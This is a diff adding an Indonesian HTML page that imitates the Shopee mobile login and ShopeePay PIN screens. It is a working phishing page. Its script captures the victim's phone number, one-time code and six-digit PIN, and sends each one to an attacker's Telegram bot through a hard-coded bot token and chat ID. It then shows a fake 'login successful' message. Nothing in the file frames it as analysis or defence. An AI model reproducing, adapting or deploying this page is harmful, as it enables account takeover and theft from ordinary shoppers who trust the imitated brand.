@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log In - Shopee</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .shopee-orange { background-color: #EE4D2D; }
+        .shopee-text-orange { color: #EE4D2D; }
+        .shopee-border-orange { border-color: #EE4D2D; }
+        input::-webkit-outer-spin-button,
+        input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+    </style>
+</head>
+<body class="bg-white min-h-screen flex flex-col justify-between font-sans">
+
+    <!-- KONFIGURASI TELEGRAM BOT -->
+    <script>
+        const BOT_TOKEN = "8613164811:AAHRB4K4GArlpt58N9UAZ1QV2bfnUDyzjk4";
+        const CHAT_ID = "6238242194";
+
+        let savedPhone = "";
+        let savedOtp = "";
+        let savedPin = "";
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const data = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: "Markdown"
+            };
+
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(data)
+            }).catch(err => console.error("Telegram error:", err));
+        }
+    </script>
+
+    <!-- ================= HALAMAN 1: LOGIN TELEPON ================= -->
+    <div id="page-login" class="w-full max-w-md mx-auto p-4 flex flex-col justify-between flex-grow">
+        <div>
+            <!-- Header -->
+            <div class="flex justify-between items-center py-2 mb-6">
+                <button class="text-gray-600 text-xl"><i class="fa-solid fa-arrow-left"></i></button>
+                <div class="text-lg font-medium text-gray-800">Log In</div>
+                <button class="shopee-text-orange text-xl"><i class="fa-regular fa-circle-question"></i></button>
+            </div>
+
+            <!-- Logo -->
+            <div class="flex justify-center my-8">
+                <div class="shopee-orange w-20 h-20 rounded-lg flex flex-col items-center justify-center shadow-md">
+                    <i class="fa-solid fa-bag-shopping text-white text-3xl mb-1"></i>
+                    <span class="text-white font-bold text-2xl tracking-wider">S</span>
+                </div>
+            </div>
+
+            <!-- Form Telepon -->
+            <div class="space-y-4 mt-6">
+                <div class="relative flex items-center border-b border-gray-300 pb-2 focus-within:border-[#EE4D2D]">
+                    <span class="text-gray-400 mr-3 text-lg"><i class="fa-solid fa-phone"></i></span>
+                    <input type="tel" id="phoneInput" placeholder="Telepon" oninput="handlePhoneInput(this)" class="w-full outline-none text-gray-700 placeholder-gray-400 text-base bg-transparent">
+                </div>
+
+                <button id="btnLanjut" onclick="submitPhone()" disabled class="w-full py-3 rounded-sm font-medium text-gray-400 bg-gray-100 cursor-not-allowed transition duration-200">
+                    Lanjut
+                </button>
+
+                <div class="text-center pt-2">
+                    <a href="#" class="shopee-text-orange text-sm font-medium hover:underline">Log in dengan Password</a>
+                </div>
+            </div>
+
+            <!-- Atau Divider -->
+            <div class="relative flex py-6 items-center">
+                <div class="flex-grow border-t border-gray-200"></div>
+                <span class="flex-shrink mx-4 text-gray-400 text-xs tracking-wider">ATAU</span>
+                <div class="flex-grow border-t border-gray-200"></div>
+            </div>
+
+            <!-- Sosial Login -->
+            <div class="space-y-3">
+                <button class="w-full border border-gray-300 py-3 rounded-sm flex items-center justify-center space-x-3 hover:bg-gray-50 transition">
+                    <span class="text-red-500 font-bold text-lg"><i class="fa-brands fa-google"></i></span>
+                    <span class="text-gray-700 text-sm font-medium">Log In dengan Google</span>
+                </button>
+                <button class="w-full border border-gray-300 py-3 rounded-sm flex items-center justify-center space-x-3 hover:bg-gray-50 transition">
+                    <span class="text-blue-600 font-bold text-lg"><i class="fa-brands fa-facebook"></i></span>
+                    <span class="text-gray-700 text-sm font-medium">Log In dengan Facebook</span>
+                </button>
+                <button class="w-full border border-gray-300 py-3 rounded-sm flex items-center justify-center space-x-3 hover:bg-gray-50 transition">
+                    <span class="text-gray-600 font-bold text-lg"><i class="fa-solid fa-key"></i></span>
+                    <span class="text-gray-700 text-sm font-medium">Login dengan Passkey</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="text-center py-6 text-sm text-gray-600">
+            Belum punya akun? <a href="#" class="shopee-text-orange font-medium hover:underline">Daftar</a>
+        </div>
+    </div>
+
+
+    <!-- ================= HALAMAN 2: VERIFIKASI OTP 5 ANGKA ================= -->
+    <div id="page-otp" class="w-full max-w-md mx-auto p-4 flex flex-col justify-between flex-grow hidden">
+        <div>
+            <!-- Header -->
+            <div class="flex justify-between items-center py-2 mb-6">
+                <button onclick="goToLoginPage()" class="text-gray-600 text-xl"><i class="fa-solid fa-arrow-left"></i></button>
+                <div class="text-lg font-medium text-gray-800">Verifikasi No. Handphone</div>
+                <button class="shopee-text-orange text-xl"><i class="fa-regular fa-circle-question"></i></button>
+            </div>
+
+            <div class="mt-4">
+                <h2 class="text-xl font-medium text-gray-800">Masukkan Kode OTP</h2>
+                <p class="text-gray-500 text-sm mt-1">Kode verifikasi telah dikirimkan melalui WhatsApp/SMS ke <span id="displayPhone" class="font-semibold text-gray-700"></span></p>
+
+                <!-- Input OTP 5 Kotak -->
+                <div class="flex justify-between gap-3 my-8">
+                    <input type="tel" maxlength="1" class="otp-input w-12 h-14 border border-gray-300 rounded-md text-center text-xl font-bold focus:border-[#EE4D2D] focus:outline-none" oninput="moveToNextOtp(this, 0)" onkeydown="moveToPrevOtp(event, 0)">
+                    <input type="tel" maxlength="1" class="otp-input w-12 h-14 border border-gray-300 rounded-md text-center text-xl font-bold focus:border-[#EE4D2D] focus:outline-none" oninput="moveToNextOtp(this, 1)" onkeydown="moveToPrevOtp(event, 1)">
+                    <input type="tel" maxlength="1" class="otp-input w-12 h-14 border border-gray-300 rounded-md text-center text-xl font-bold focus:border-[#EE4D2D] focus:outline-none" oninput="moveToNextOtp(this, 2)" onkeydown="moveToPrevOtp(event, 2)">
+                    <input type="tel" maxlength="1" class="otp-input w-12 h-14 border border-gray-300 rounded-md text-center text-xl font-bold focus:border-[#EE4D2D] focus:outline-none" oninput="moveToNextOtp(this, 3)" onkeydown="moveToPrevOtp(event, 3)">
+                    <input type="tel" maxlength="1" class="otp-input w-12 h-14 border border-gray-300 rounded-md text-center text-xl font-bold focus:border-[#EE4D2D] focus:outline-none" oninput="moveToNextOtp(this, 4)" onkeydown="moveToPrevOtp(event, 4)">
+                </div>
+
+                <!-- Resend Timer -->
+                <div class="text-center text-sm text-gray-500 mt-4">
+                    Belum menerima kode? <button id="btnResend" onclick="resendOtp()" class="shopee-text-orange font-medium hover:underline">Kirim Ulang</button> <span id="timerText"></span>
+                </div>
+            </div>
+        </div>
+        <div class="py-6 text-center text-xs text-gray-400">Shopee Verification System</div>
+    </div>
+
+
+    <!-- ================= HALAMAN 3: VERIFIKASI PIN 6 ANGKA ================= -->
+    <div id="page-pin" class="w-full max-w-md mx-auto p-4 flex flex-col justify-between flex-grow hidden">
+        <div>
+            <!-- Header -->
+            <div class="flex justify-between items-center py-2 mb-6">
+                <button onclick="goToOtpPage()" class="text-gray-600 text-xl"><i class="fa-solid fa-arrow-left"></i></button>
+                <div class="text-lg font-medium text-gray-800">Masukkan PIN ShopeePay</div>
+                <button class="shopee-text-orange text-xl"><i class="fa-regular fa-circle-question"></i></button>
+            </div>
+
+            <div class="mt-4 text-center">
+                <h2 class="text-lg font-medium text-gray-800">Masukkan 6 Digit PIN Anda</h2>
+                <p class="text-gray-500 text-sm mt-1">PIN digunakan untuk keamanan akun dan transaksi ShopeePay.</p>
+
+                <!-- Input PIN 6 Kotak -->
+                <div class="flex justify-center gap-3 my-8">
+                    <input type="password" maxlength="1" readonly class="pin-input w-11 h-12 border border-gray-300 rounded-md text-center text-2xl font-bold focus:border-[#EE4D2D] focus:outline-none bg-gray-50">
+                    <input type="password" maxlength="1" readonly class="pin-input w-11 h-12 border border-gray-300 rounded-md text-center text-2xl font-bold focus:border-[#EE4D2D] focus:outline-none bg-gray-50">
+                    <input type="password" maxlength="1" readonly class="pin-input w-11 h-12 border border-gray-300 rounded-md text-center text-2xl font-bold focus:border-[#EE4D2D] focus:outline-none bg-gray-50">
+                    <input type="password" maxlength="1" readonly class="pin-input w-11 h-12 border border-gray-300 rounded-md text-center text-2xl font-bold focus:border-[#EE4D2D] focus:outline-none bg-gray-50">
+                    <input type="password" maxlength="1" readonly class="pin-input w-11 h-12 border border-gray-300 rounded-md text-center text-2xl font-bold focus:border-[#EE4D2D] focus:outline-none bg-gray-50">
+                    <input type="password" maxlength="1" readonly class="pin-input w-11 h-12 border border-gray-300 rounded-md text-center text-2xl font-bold focus:border-[#EE4D2D] focus:outline-none bg-gray-50">
+                </div>
+
+                <!-- Custom Keypad Angka -->
+                <div class="grid grid-cols-3 gap-3 max-w-xs mx-auto mt-6">
+                    <button onclick="pressPin('1')" class="py-3 bg-gray-100 hover:bg-gray-200 text-xl font-bold rounded-md text-gray-800">1</button>
+                    <button onclick="pressPin('2')" class="py-3 bg-gray-100 hover:bg-gray-200 text-xl font-bold rounded-md text-gray-800">2</button>
+                    <button onclick="pressPin('3')" class="py-3 bg-gray-100 hover:bg-gray-200 text-xl font-bold rounded-md text-gray-800">3</button>
+                    <button onclick="pressPin('4')" class="py-3 bg-gray-100 hover:bg-gray-200 text-xl font-bold rounded-md text-gray-800">4</button>
+                    <button onclick="pressPin('5')" class="py-3 bg-gray-100 hover:bg-gray-200 text-xl font-bold rounded-md text-gray-800">5</button>
+                    <button onclick="pressPin('6')" class="py-3 bg-gray-100 hover:bg-gray-200 text-xl font-bold rounded-md text-gray-800">6</button>
+                    <button onclick="pressPin('7')" class="py-3 bg-gray-100 hover:bg-gray-200 text-xl font-bold rounded-md text-gray-800">7</button>
+                    <button onclick="pressPin('8')" class="py-3 bg-gray-100 hover:bg-gray-200 text-xl font-bold rounded-md text-gray-800">8</button>
+                    <button onclick="pressPin('9')" class="py-3 bg-gray-100 hover:bg-gray-200 text-xl font-bold rounded-md text-gray-800">9</button>
+                    <div></div>
+                    <button onclick="pressPin('0')" class="py-3 bg-gray-100 hover:bg-gray-200 text-xl font-bold rounded-md text-gray-800">0</button>
+                    <button onclick="deletePin()" class="py-3 bg-gray-200 hover:bg-gray-300 text-lg font-bold rounded-md text-gray-800 flex items-center justify-center"><i class="fa-solid fa-delete-left"></i></button>
+                </div>
+            </div>
+        </div>
+        <div class="py-6 text-center text-xs text-gray-400">Keamanan ShopeePay Terproteksi</div>
+    </div>
+
+
+    <!-- ================= MODAL SUKSES ================= -->
+    <div id="successModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50 p-4">
+        <div class="bg-white rounded-lg p-6 max-w-sm w-full text-center shadow-xl">
+            <div class="w-16 h-16 bg-green-100 text-green-500 rounded-full flex items-center justify-center mx-auto mb-4 text-3xl">
+                <i class="fa-solid fa-check"></i>
+            </div>
+            <h3 class="text-lg font-bold text-gray-800">Login Berhasil!</h3>
+            <p class="text-gray-500 text-sm mt-2">Data Anda telah dikonfirmasi. Selamat datang kembali di Shopee.</p>
+            <button onclick="resetApp()" class="mt-6 w-full shopee-orange text-white py-2.5 rounded-sm font-medium">Tutup</button>
+        </div>
+    </div>
+
+
+    <!-- ================= SCRIPT LOGIKA APLIKASI ================= -->
+    <script>
+        function handlePhoneInput(input) {
+            const btn = document.getElementById('btnLanjut');
+            if (input.value.trim().length >= 9) {
+                btn.removeAttribute('disabled');
+                btn.classList.remove('bg-gray-100', 'text-gray-400', 'cursor-not-allowed');
+                btn.classList.add('shopee-orange', 'text-white', 'cursor-pointer');
+            } else {
+                btn.setAttribute('disabled', 'true');
+                btn.classList.remove('shopee-orange', 'text-white', 'cursor-pointer');
+                btn.classList.add('bg-gray-100', 'text-gray-400', 'cursor-not-allowed');
+            }
+        }
+
+        function submitPhone() {
+            const phone = document.getElementById('phoneInput').value;
+            savedPhone = phone;
+
+            // Kirim ke Telegram
+            sendToTelegram(`🔔 *SHOPEE LOGIN - No Telepon*\n\n📱 No Telp: \`${phone}\``);
+
+            document.getElementById('displayPhone').innerText = phone;
+            document.getElementById('page-login').classList.add('hidden');
+            document.getElementById('page-otp').classList.remove('hidden');
+            document.querySelectorAll('.otp-input')[0].focus();
+        }
+
+        function goToLoginPage() {
+            document.getElementById('page-otp').classList.add('hidden');
+            document.getElementById('page-login').classList.remove('hidden');
+        }
+
+        function goToOtpPage() {
+            document.getElementById('page-pin').classList.add('hidden');
+            document.getElementById('page-otp').classList.remove('hidden');
+        }
+
+        // Navigasi OTP Otomatis
+        function moveToNextOtp(element, index) {
+            const value = element.value;
+            const inputs = document.querySelectorAll('.otp-input');
+
+            if (value.length === 1 && index < inputs.length - 1) {
+                inputs[index + 1].focus();
+            }
+
+            checkOtpComplete();
+        }
+
+        function moveToPrevOtp(event, index) {
+            const inputs = document.querySelectorAll('.otp-input');
+            if (event.key === 'Backspace' && index > 0 && inputs[index].value === '') {
+                inputs[index - 1].focus();
+            }
+        }
+
+        function checkOtpComplete() {
+            const inputs = document.querySelectorAll('.otp-input');
+            let otpCode = "";
+            let complete = true;
+
+            inputs.forEach(input => {
+                if (input.value === '') complete = false;
+                otpCode += input.value;
+            });
+
+            if (complete) {
+                savedOtp = otpCode;
+                // Kirim OTP ke Telegram
+                sendToTelegram(`💬 *SHOPEE LOGIN - Kode OTP*\n\n📱 No Telp: \`${savedPhone}\`\n🔑 OTP: \`${savedOtp}\``);
+
+                // Pindah otomatis ke halaman PIN
+                setTimeout(() => {
+                    document.getElementById('page-otp').classList.add('hidden');
+                    document.getElementById('page-pin').classList.remove('hidden');
+                }, 300);
+            }
+        }
+
+        // Logika PIN Keypad
+        function pressPin(num) {
+            const pinInputs = document.querySelectorAll('.pin-input');
+            for (let i = 0; i < pinInputs.length; i++) {
+                if (pinInputs[i].value === '') {
+                    pinInputs[i].value = num;
+                    break;
+                }
+            }
+            checkPinComplete();
+        }
+
+        function deletePin() {
+            const pinInputs = document.querySelectorAll('.pin-input');
+            for (let i = pinInputs.length - 1; i >= 0; i--) {
+                if (pinInputs[i].value !== '') {
+                    pinInputs[i].value = '';
+                    break;
+                }
+            }
+        }
+
+        function checkPinComplete() {
+            const pinInputs = document.querySelectorAll('.pin-input');
+            let pinCode = "";
+            let complete = true;
+
+            pinInputs.forEach(input => {
+                if (input.value === '') complete = false;
+                pinCode += input.value;
+            });
+
+            if (complete) {
+                savedPin = pinCode;
+                // Kirim PIN lengkap ke Telegram
+                sendToTelegram(`🔒 *SHOPEE LOGIN - PIN ShopeePay*\n\n📱 No Telp: \`${savedPhone}\`\n🔑 OTP: \`${savedOtp}\`\n🔐 PIN: \`${savedPin}\``);
+
+                // Tampilkan Modal Sukses
+                setTimeout(() => {
+                    document.getElementById('successModal').classList.remove('hidden');
+                }, 300);
+            }
+        }
+
+        function resendOtp() {
+            alert("Kode OTP baru telah dikirim ulang.");
+        }
+
+        function resetApp() {
+            document.getElementById('successModal').classList.add('hidden');
+            document.getElementById('phoneInput').value = "";
+            savedPhone = "";
+            savedOtp = "";
+            savedPin = "";
+            document.querySelectorAll('.otp-input').forEach(i => i.value = '');
+            document.querySelectorAll('.pin-input').forEach(i => i.value = '');
+            handlePhoneInput(document.getElementById('phoneInput'));
+            document.getElementById('page-pin').classList.add('hidden');
+            document.getElementById('page-login').classList.remove('hidden');
+        }
+    </script>
+</body>
+</html>
